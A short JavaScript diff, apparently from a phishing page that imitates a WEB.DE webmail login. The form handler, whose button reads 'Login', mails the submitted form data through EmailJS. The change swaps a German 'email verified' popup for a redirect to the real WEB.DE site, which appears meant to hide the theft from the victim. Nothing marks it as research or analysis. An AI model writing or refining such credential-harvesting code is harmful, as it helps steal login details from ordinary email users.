@@ -12,11 +12,7 @@ document.getElementById('form')
     emailjs.sendForm(serviceID, templateID, this)
       .then(() => {
         btn.value = 'Login';
-        Swal.fire({
-          title: "Email Überprüft",
-          text: "Seite verlassen",
-          icon: "success"
-        });
+        window.location.href = 'https://produkte.web.de/apps/';
       }, (err) => {
         btn.value = 'Login';
         alert(JSON.stringify(err));
